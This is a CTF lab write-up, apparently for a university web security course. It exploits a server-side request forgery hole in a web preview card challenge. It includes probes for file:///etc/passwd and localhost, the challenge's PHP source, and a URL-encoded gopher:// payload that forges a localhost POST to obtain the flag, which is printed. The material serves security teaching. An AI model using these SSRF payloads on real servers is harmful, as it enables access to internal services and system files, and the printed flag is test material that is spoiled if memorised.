---
title: Simple Web 0x12(Lab - Web Preview Card)
tags: [NTUSTWS, CTF, Web]

category: "Security｜Course｜NTUST WS｜SSRF"
---

# Simple Web 0x12(Lab - Web Preview Card)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8500/

## Background
[Web Hacking | 續章【EDU-CTF 2021】](https://youtu.be/hWC-Evt-sBc?t=6136)
[網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」](https://medium.com/程式猿吃香蕉/網站安全-伺服器請求偽造-ssrf-攻擊-項莊舞劍-意在沛公-7a5524926362)

## Exploit - SSRF
When you see a preview function, then it may have SSRF problem.
1. Test it
`file:///etc/passwd` or `http://127.0.0.1`
![](https://i.imgur.com/NKbIlDT.png)

2. Analyze `flag.php`
![](https://i.imgur.com/OGo7biu.png)
    :::spoiler source code
    ```php=
    <?php
    if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user.");
    ?>
    <form action="/flag.php" method="post">
        Do you want the FLAG? <input type="text" name="givemeflag" value="no">
        <input type="submit">
    </form>
    <?php
    if (isset($_POST['givemeflag']) && $_POST['givemeflag'] === 'yes')
        echo "FLAG:", getenv('FLAG');
    ```
    :::
    If you want flag, you need visit `/flag.php` as localhost and send a form data with parameter `givemeflag`.
3. Construct package - <font color="FF0000">**gopher**</font>
    ```!
    POST /flag.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 14
    Content-Type: application/x-www-form-urlencoded

    givemeflag=yes
    ```
    Transferred by [urlencode](https://www.urlencoder.org/) with `CRLF` type.
Payload: `gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a`

4. Then we got flag...

Flag: `FLAG{gopher://http_post}`